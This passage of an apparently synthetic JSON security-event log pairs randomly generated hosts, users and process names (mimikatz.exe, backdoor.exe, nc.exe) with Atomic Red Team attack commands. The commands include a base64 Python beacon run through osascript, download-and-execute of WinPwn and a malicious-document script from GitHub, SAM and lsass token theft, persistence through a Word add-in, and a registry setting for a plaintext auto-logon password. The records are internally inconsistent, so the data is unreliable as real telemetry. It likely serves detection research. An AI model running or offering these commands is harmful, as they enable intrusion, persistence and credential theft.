        "CommandLine": "\"osascript -e \\\"do shell script \\\\\\\"echo \\\\\\\\\\\\\\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));\\\\\\\\\\\\\\\" | python &\\\\\\\"\\\"\\n\",",
        "LogonID": 173998,
        "LogonGuid": "8e6d5d62-38a7-46d5-824f-6c59670b7e9d",
        "SourceProcessID": 7474,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\yard..dll",
        "DestinationProcessID": 2989,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\customer..exe",
        "UtcTime": "2024-05-17T01:36:51.744326Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-75.wall.com",
        "User": "josephcurry",
        "ProcessID": 9222,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"wmic /node:\\\"#{target_host}\\\" process call create \\\"cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}\\\"\\n\",",
        "LogonID": 573501,
        "LogonGuid": "c12b0333-2105-4ebc-ab02-5423ed89a51a",
        "SourceProcessID": 6013,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\hundred..exe",
        "DestinationProcessID": 6139,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\life..dll",
        "UtcTime": "2024-05-17T01:36:51.744326Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-68.hill.org",
        "User": "joshua61",
        "ProcessID": 9826,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"$process = Start-Process #{spawn_process_path} -passthru\\n$PathToAtomicsFolder\\\\T1055\\\\bin\\\\x64\\\\RtlCreateUserThread.exe -pid $process.Id -debug\\n\",",
        "LogonID": 970967,
        "LogonGuid": "a277172e-e12f-4390-90ca-3aa639a0468f",
        "SourceProcessID": 8284,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\water..dll",
        "DestinationProcessID": 4213,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\yourself..dll",
        "UtcTime": "2024-05-17T01:36:51.744326Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-20.rodriguez.biz",
        "User": "alexandersanchez",
        "ProcessID": 2609,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"mkdir ~/Library/Mail/copy\\ncp -R ~/Library/Mail/* ~/Library/Mail/copy\\necho \\\"Manipulated data\\\" > ~/Library/Mail/copy/manipulated.txt\\n\",",
        "LogonID": 905850,
        "LogonGuid": "8ed97ce9-7e60-4921-a81f-76e505aadd47",
        "SourceProcessID": 5376,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\life..dll",
        "DestinationProcessID": 6216,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\campaign..dll",
        "UtcTime": "2024-05-17T01:36:51.745331Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-48.knight-arroyo.com",
        "User": "robertjohnson",
        "ProcessID": 4271,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\\\\..\\\\atomics\\\\T1562.004\\\\src\\\\esxi_disable_firewall.txt\\n\",",
        "LogonID": 139796,
        "LogonGuid": "8d77c008-bc02-49d2-bf5d-0dd1bc96eee9",
        "SourceProcessID": 9562,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\beat..dll",
        "DestinationProcessID": 4757,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\rest..exe",
        "UtcTime": "2024-05-17T01:36:51.745331Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-26.lopez.com",
        "User": "wendy71",
        "ProcessID": 3906,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"import -window root #{output_file}\\n\",",
        "LogonID": 628684,
        "LogonGuid": "4ce5b1c6-5b7a-45c2-9ae4-be47638f0ba1",
        "SourceProcessID": 3900,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\green..exe",
        "DestinationProcessID": 9322,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\none..exe",
        "UtcTime": "2024-05-17T01:36:51.745331Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-67.morgan.com",
        "User": "rebecca16",
        "ProcessID": 8542,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"Set-ExecutionPolicy -Scope Process Bypass -Force\\n$owners = @{}\\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}\\nGet-Process | Select ProcessName,Id,@{l=\\\"Owner\\\";e={$owners[$_.id.tostring()]}}\\n& \\\"$PathToAtomicsFolder\\\\T1134.002\\\\src\\\\GetToken.ps1\\\"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,\\\"cmd.exe\\\")\\n\",",
        "LogonID": 966796,
        "LogonGuid": "525950fa-0383-4a93-a5e7-a518398f6881",
        "SourceProcessID": 9481,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\simple..exe",
        "DestinationProcessID": 3945,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\Mr..dll",
        "UtcTime": "2024-05-17T01:36:51.745331Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-83.richards.com",
        "User": "qkirby",
        "ProcessID": 3633,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Start-Process \\\"#{Ammyy_Admin_Path}\\\"\\n\",",
        "LogonID": 601012,
        "LogonGuid": "e7ac3859-121a-4f5e-b5b7-01006e50ab5b",
        "SourceProcessID": 2344,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\with..dll",
        "DestinationProcessID": 6184,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\surface..dll",
        "UtcTime": "2024-05-17T01:36:51.745331Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-12.malone-greene.org",
        "User": "zcollins",
        "ProcessID": 7049,
        "ProcessName": "malware.exe",
        "CommandLine": "\"$file = Get-Item $env:temp\\\\T1564.001-9.txt -Force\\n$file.attributes='Hidden'\\n\",",
        "LogonID": 451952,
        "LogonGuid": "1029167f-6b83-4a6a-b197-517be5a9c43e",
        "SourceProcessID": 9621,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\project..dll",
        "DestinationProcessID": 1340,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\hair..exe",
        "UtcTime": "2024-05-17T01:36:51.745331Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-60.zimmerman.com",
        "User": "floydjason",
        "ProcessID": 4427,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"copy-item -Path \\\"\\\\\\\\#{remote}\\\\C$\\\\#{share_file}\\\" -Destination \\\"$Env:TEMP\\\\#{local_file}\\\"\",",
        "LogonID": 906330,
        "LogonGuid": "bb2da85b-7c25-484a-9b28-f177bb68c8f2",
        "SourceProcessID": 4515,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\science..exe",
        "DestinationProcessID": 1083,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\happen..exe",
        "UtcTime": "2024-05-17T01:36:51.746333Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-74.pham-jackson.com",
        "User": "ymaxwell",
        "ProcessID": 8731,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"halt -r\\n\",",
        "LogonID": 874178,
        "LogonGuid": "f1580fb5-f32d-427d-94d9-49aa33a72622",
        "SourceProcessID": 1434,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\other..dll",
        "DestinationProcessID": 2810,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\firm..exe",
        "UtcTime": "2024-05-17T01:36:51.746333Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-31.higgins.biz",
        "User": "samantha58",
        "ProcessID": 4960,
        "ProcessName": "malware.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (iwr \\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\\\" -UseBasicParsing)\\n$macrocode = \\\"   Open `\\\"#{jse_path}`\\\" For Output As #1`n   Write #1, `\\\"WScript.Quit`\\\"`n   Close #1`n   a = Shell(`\\\"cmd.exe /c wscript.exe //E:jscript #{jse_path}`\\\", vbNormalFocus)`n\\\"\\nInvoke-MalDoc -macroCode $macrocode -officeProduct \\\"#{ms_product}\\\"\\n\",",
        "LogonID": 604004,
        "LogonGuid": "7d8a3f74-c5f7-480d-8645-a613be2f2402",
        "SourceProcessID": 1872,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\south..exe",
        "DestinationProcessID": 8843,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\travel..exe",
        "UtcTime": "2024-05-17T01:36:51.746333Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-44.bradley.net",
        "User": "pmccarthy",
        "ProcessID": 1269,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"wmic /node:\\\"#{target_host}\\\" process call create \\\"cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}\\\"\\n\",",
        "LogonID": 248442,
        "LogonGuid": "9959169d-e3da-4047-b15c-89824c0701d1",
        "SourceProcessID": 1357,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\miss..dll",
        "DestinationProcessID": 8355,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\reach..dll",
        "UtcTime": "2024-05-17T01:36:51.746333Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-98.gibson.biz",
        "User": "mholmes",
        "ProcessID": 5331,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"pgrep -l 'bareos-fd|icinga2|cbagentd|wazuh-agent|packetbeat|filebeat|osqueryd'\\n\",",
        "LogonID": 879756,
        "LogonGuid": "c65966e3-7419-4d52-9dac-49d1ecbcf5c5",
        "SourceProcessID": 2216,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\wide..exe",
        "DestinationProcessID": 9506,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\institution..dll",
        "UtcTime": "2024-05-17T01:36:51.746333Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-67.savage-roberts.biz",
        "User": "potteranne",
        "ProcessID": 3323,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"$wdApp = New-Object -COMObject \\\"Word.Application\\\"\\nif(-not $wdApp.path.contains(\\\"Program Files (x86)\\\"))  \\n{\\n  Write-Host \\\"64-bit Office\\\"\\n  Copy \\\"PathToAtomicsFolder\\\\T1137.006\\\\bin\\\\Addins\\\\wordwll_x64.wll\\\" \\\"$env:APPDATA\\\\Microsoft\\\\Word\\\\Startup\\\\notepad.wll\\\"        \\n}\\nelse{\\n  Write-Host \\\"32-bit Office\\\"\\n  Copy \\\"PathToAtomicsFolder\\\\T1137.006\\\\bin\\\\Addins\\\\wordwll_x86.wll\\\" \\\"$env:APPDATA\\\\Microsoft\\\\Word\\\\Startup\\\\notepad.wll\\\"\\n}\\nStop-Process -Name \\\"WinWord\\\" \\nStart-Process \\\"WinWord\\\"\\n\",",
        "LogonID": 139928,
        "LogonGuid": "dcf45e6b-daa3-4742-a053-19438e68637b",
        "SourceProcessID": 5223,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\book..dll",
        "DestinationProcessID": 7477,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\then..dll",
        "UtcTime": "2024-05-17T01:36:51.747332Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-56.lopez-reynolds.com",
        "User": "ireed",
        "ProcessID": 4852,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"tcpdump -c 5 -nnni #{interface}\\ntshark -c 5 -i #{interface}\\n\",",
        "LogonID": 248168,
        "LogonGuid": "149a8ae5-ff88-497f-8e73-bcb3eb438e40",
        "SourceProcessID": 9137,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\side..exe",
        "DestinationProcessID": 9723,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\interesting..dll",
        "UtcTime": "2024-05-17T01:36:51.747332Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-17.davis-becker.info",
        "User": "collinsalyssa",
        "ProcessID": 1232,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"for bucket in \\\"$(aws s3 ls | cut -d \\\" \\\" -f3)\\\"; do aws s3api list-objects-v2 --bucket $bucket --output text; done\\n\",",
        "LogonID": 459340,
        "LogonGuid": "0f691003-39da-4723-976c-70eb1e7a038f",
        "SourceProcessID": 4129,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\allow..exe",
        "DestinationProcessID": 3144,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\feeling..dll",
        "UtcTime": "2024-05-17T01:36:51.747332Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-68.mccormick.org",
        "User": "hollandjonathan",
        "ProcessID": 5631,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\FIDO\\\" /v \\\"AllowExternalDeviceSignon\\\" /t REG_DWORD /d 0 /f\\n\",",
        "LogonID": 467746,
        "LogonGuid": "e7dc5285-bcd2-4566-904a-5a954bb5b66e",
        "SourceProcessID": 5327,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\force..dll",
        "DestinationProcessID": 2906,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\huge..exe",
        "UtcTime": "2024-05-17T01:36:51.747332Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-73.moore-bennett.com",
        "User": "audreyporter",
        "ProcessID": 2394,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"New-ItemProperty \\\"HKLM:\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force\\nNew-ItemProperty \\\"HKLM:\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" -Name DefaultUserName -Value Administrator -Force\\nNew-ItemProperty \\\"HKLM:\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" -Name DefaultDomainName -Value contoso.com -Force\\nNew-ItemProperty \\\"HKLM:\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" -Name DefaultPassword  -Value password1 -Force\\n\",",
        "LogonID": 317177,
        "LogonGuid": "11f90bd5-486a-499c-b31e-2dd7cffb88f9",
        "SourceProcessID": 4850,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\hair..dll",
        "DestinationProcessID": 7288,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\population..dll",
        "UtcTime": "2024-05-17T01:36:51.747332Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-54.marshall.com",
        "User": "ebonyscott",
        "ProcessID": 1517,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"$xml = [System.IO.File]::ReadAllText(\\\"#{xml_path}\\\")\\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \\\"Root\\\\Microsoft\\\\Windows\\\\TaskScheduler\\\" -MethodName \\\"RegisterByXml\\\" -Arguments @{ Force = $true; Xml =$xml; }\\n\",",
        "LogonID": 182878,
        "LogonGuid": "668ea213-2e16-4297-ba8e-1c5ab8d68a39",
        "SourceProcessID": 8998,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\chair..dll",
        "DestinationProcessID": 2520,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\assume..exe",
        "UtcTime": "2024-05-17T01:36:51.748331Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-00.ryan.info",
        "User": "lanechristopher",
        "ProcessID": 3061,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\" /v NoLogOff /t REG_DWORD /d 1 /f\\nreg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\" /v StartMenuLogOff /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 372268,
        "LogonGuid": "da6fb4f2-7b1d-4aab-863e-3c49fd79b54b",
        "SourceProcessID": 3410,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\remember..exe",
        "DestinationProcessID": 7426,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\standard..exe",
        "UtcTime": "2024-05-17T01:36:51.748331Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-79.cole.com",
        "User": "williamsonbrent",
        "ProcessID": 1159,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nsamfile -consoleoutput -noninteractive  \",",
        "LogonID": 146809,
        "LogonGuid": "99ac7005-414d-4997-8b21-9ead5993ef5e",
        "SourceProcessID": 3349,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\why..exe",
        "DestinationProcessID": 1626,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\unit..exe",
        "UtcTime": "2024-05-17T01:36:51.748331Z"
    },
